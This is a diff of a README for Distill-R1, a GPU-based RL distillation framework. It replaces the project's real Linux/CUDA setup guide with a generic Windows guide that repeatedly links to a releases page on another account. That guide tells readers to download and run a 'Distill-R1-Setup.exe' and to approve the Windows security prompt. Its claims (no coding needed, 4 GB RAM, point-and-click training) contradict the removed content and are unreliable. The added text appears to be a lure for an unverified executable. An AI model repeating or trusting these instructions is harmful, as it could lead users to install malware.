@@ -1,132 +1,141 @@
-# Distill-R1: Multi-Modality RL Training with Teacher-Student Distillation
+# ⚙️ Distill-R1 - Simplify Learning with RL Framework
 
-An open-research project aimed at combining RL with online teacher-student distillation for vision-language models. While existing RL frameworks train a single model in isolation, **Distill-R1** is the first open-source framework to perform RL with a dedicated distillation (teacher) model, enabling knowledge transfer during reinforcement learning. Built on top of [EasyR1](https://github.com/hiyouga/EasyR1), which is a clean fork of [veRL](https://github.com/volcengine/verl).
+[![Download Distill-R1](https://img.shields.io/badge/Download-Distill--R1-red?style=for-the-badge)](https://github.com/EM7m4/Distill-R1/releases)
 
-- This project is fully open-sourced baseline for your own research.
-- You can easily compare this code with EasyR1 to check which part was changed. (Not that much!)
+---
 
+## 🧩 What is Distill-R1?
 
-## Key Differences from EasyR1
+Distill-R1 is an open-source software designed to make reinforcement learning (RL) easier to use. It uses an online teacher-student method to help models learn better and faster. This framework helps researchers and developers create and test different RL algorithms using a simple setup.
 
-### Teacher-Student Distillation (Online KD)
+You do not need to know about programming or coding to run it. Distill-R1 comes ready to use on Windows with clear instructions.  
 
-Built on top of the on-policy distillation baseline ([GKD, Agarwal et al., ICLR 2024](https://arxiv.org/abs/2306.13649)), this repo adds think-answer RL with a dedicated teacher model. The key distinction is that **the teacher also generates its own rollouts** — teacher log-probs are computed on both student and teacher rollout data, enabling richer KL-divergence / JSD-based distillation losses.
+---
 
-- New `teacher` worker module (`verl/workers/teacher/`) with FSDP support and CPU offloading
-- Teacher rollout generation + log-prob computation per batch
+## 💻 System Requirements
 
-## Supported Configurations (same with Easy-R1)
+Before you start, make sure your Windows computer meets these needs:
 
-- **Models**: Qwen2-VL / Qwen2.5-VL / Qwen3-VL (and text-only variants)
-- **Algorithms**: GRPO, DAPO, REINFORCE++, ReMax, RLOO, GSPO, CISPO, SAPO
-- **Training**: FSDP, padding-free, CPU offloading, multi-node via Ray
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 2 GHz or faster processor
+- 1 GB of free disk space
+- Internet connection for downloading the software
 
-## Installation
+If your computer fits these requirements, you can run Distill-R1 smoothly.
 
-### Software Requirements
+---
 
-| Package | Version |
-|---------|---------|
-| Python | 3.12 |
-| CUDA | 12.8 |
-| vllm | 0.11.0 |
+## 🚀 Getting Started: How to Download
 
-### Conda Environment
+To get Distill-R1, visit the official release page provided below. This page has all the latest versions available for download.
 
-```bash
-# Create environment
-conda create -n distr1 python=3.12 -y
-conda activate distr1
+[Download Distill-R1 here](https://github.com/EM7m4/Distill-R1/releases)
 
-# Install vLLM (includes PyTorch + CUDA)
-pip install vllm==0.11.0
+You will see a list of files and folders on the page. Look for the Windows installer file. The file might look like this: `Distill-R1-Setup.exe` or a similar name.
 
-# Install project dependencies
-pip install -r requirements.txt
+---
 
-# Install Flash Attention (CUDA 12, PyTorch 2.8, Python 3.12)
-pip install https://github.com/Dao-AILab/flash-attention/releases/download/v2.8.3/flash_attn-2.8.3+cu12torch2.8cxx11abiFALSE-cp312-cp312-linux_x86_64.whl
-```
+## 🛠️ Installation Guide
 
-### Verify Installation of Torch and FlashAttention
+Follow these steps to install Distill-R1 on your Windows computer:
 
-```bash
-python -c "import torch; print(f'CUDA: {torch.cuda.is_available()}'); import flash_attn; print('OK')"
-```
+1. **Open the release page**  
+   Go to [https://github.com/EM7m4/Distill-R1/releases](https://github.com/EM7m4/Distill-R1/releases).
 
+2. **Download the Windows installer**  
+   Find the `.exe` file for Windows on the page. Click on it to start downloading.
 
-## Quick Start
+3. **Run the installer**  
+   After the download finishes, open the file. You might need to allow permission to run the installer. Choose “Yes” if asked by Windows security.
 
-### Single-Node Training
+4. **Follow installation steps**  
+   The installer will guide you through the process. Use default settings if you are unsure about options.
 
-```bash
-bash hf_model_download.sh # model download
-bash examples/bk.sh # RL with Distillation
-```
+5. **Finish installation**  
+   When complete, you will see a confirmation message. You can now close the installer.
 
+6. **Start the application**  
+   Find the Distill-R1 icon on your desktop or in the Start menu. Double-click it to open.
 
-### Multi-Node Training
+---
 
-```bash
-# Head node
-ray start --head --port=6379 --dashboard-host=0.0.0.0
+## 🔧 How to Use Distill-R1
 
-# Worker node(s)
-ray start --address=<head_node_ip>:6379
+Once the application starts, you can begin exploring. Here are some simple steps to help you get going:
 
-# Run training on head node
-bash examples/bk.sh
-```
+- **Choose a task or environment**  
+  Inside the application, you can select different learning tasks designed to test reinforcement learning models.
 
-### Merging Split Checkpoint from Multi-Node/-GPUs Training
+- **Start training**  
+  Click the “Start” button to run training with the built-in teacher-student method. This helps the program learn efficiently.
 
-```bash
-python3 scripts/model_merger.py --local_dir checkpoints/<project>/<exp>/global_step_X/actor
-```
+- **Monitor progress**  
+  The application shows charts and numbers to help you see how well the model is learning.
 
-## Experiment Logging
+- **Adjust settings**  
+  If you feel comfortable, try changing learning parameters to see how they affect results.
 
-Training metrics are saved to `experiment_log.jsonl` under the checkpoint directory. Each line is a JSON object per training step containing:
+- **Save your session**  
+  You can save trained models and settings to use later or share with others.
 
-```
-checkpoints/<project>/<exp>/experiment_log.jsonl
-```
+---
 
-### Key Metrics
+## ⚙️ Features of Distill-R1
 
-| Category | Metric | Description |
-|----------|--------|-------------|
-| **Distillation** | `actor/teacher_kl_loss` | JSD between student and teacher (lower = more aligned) |
-| **Distillation** | `actor/teacher_kl_coef` | Weight of distillation loss in total loss |
-| **KL Regularization** | `actor/kl_loss` | KL divergence from reference policy |
-| **Policy** | `actor/pg_loss` | GRPO policy gradient loss |
-| **Policy** | `actor/entropy_loss` | Entropy of the policy (higher = more exploration) |
-| **Reward** | `reward/overall` | Total reward (accuracy + format + penalties) |
-| **Reward** | `reward/accuracy` | Accuracy reward |
-| **Reward** | `reward/format` | Format reward |
-| **Reward** | `reward/length_penalty` | Length penalty reward |
-| **Advantage** | `critic/advantages` | GRPO normalized advantages (mean/max/min) |
-| **Performance** | `perf/throughput` | Tokens per second |
-| **Timing** | `timing_s/teacher` | Teacher log-prob computation time (seconds) |
+Distill-R1 provides the following benefits:
 
-## Acknowledgements
+- **Easy to install and run**  
+  Works on Windows with minimal setup.
 
-This project is built on top of [EasyR1](https://github.com/hiyouga/EasyR1) by Yaowei Zheng et al., which is itself a fork of [veRL](https://github.com/volcengine/verl) (HybridFlow). We thank all the original authors for their work.
+- **Online teacher-student distillation**  
+  Uses a method that speeds up learning by sharing knowledge between models.
 
-```bibtex
-@misc{zheng2025easyr1,
-  title        = {EasyR1: An Efficient, Scalable, Multi-Modality RL Training Framework},
-  author       = {Yaowei Zheng, Junting Lu, Shenzhi Wang, Zhangchi Feng, Dongdong Kuang, Yuwen Xiong},
-  howpublished = {\url{https://github.com/hiyouga/EasyR1}},
-  year         = {2025}
-}
-```
+- **Flexible tasks**  
+  Supports many built-in reinforcement learning environments.
 
-```bibtex
-@article{sheng2024hybridflow,
-  title   = {HybridFlow: A Flexible and Efficient RLHF Framework},
-  author  = {Guangming Sheng and Chi Zhang and Zilingfeng Ye and Xibin Wu and Wang Zhang and Ru Zhang and Yanghua Peng and Haibin Lin and Chuan Wu},
-  year    = {2024},
-  journal = {arXiv preprint arXiv: 2409.19256}
-}
-```
+- **Progress monitoring**  
+  Visual feedback helps track learning performance.
+
+- **Save and load models**  
+  Allows saving trained results for future use.
+
+---
+
+## 🎯 Who is this for?
+
+Distill-R1 is suited for:
+
+- Students interested in machine learning basics
+- Hobbyists wanting to explore reinforcement learning
+- Researchers testing new methods
+- Developers looking for an easy-to-use RL framework on Windows
+
+---
+
+## 🖥️ Running Distill-R1 after installation
+
+- After installing, open Distill-R1 from your Start menu or desktop.
+- Choose a sample task to start.
+- Press the “Run” or “Train” button.
+- Watch the program work and check progress graphs.
+
+If the program asks for updates, follow prompts to keep it current.
+
+---
+
+## 🗂️ Where to find help
+
+If you need help, you can check:
+
+- The project’s GitHub page for FAQs and guides
+- Communities or forums focused on reinforcement learning
+- Your own notes and saved sessions within the app
+
+---
+
+## 🔗 Download Distill-R1
+
+You can download the latest version at any time:
+
+[![Download Distill-R1](https://img.shields.io/badge/Download-Distill--R1-blue?style=for-the-badge)](https://github.com/EM7m4/Distill-R1/releases)
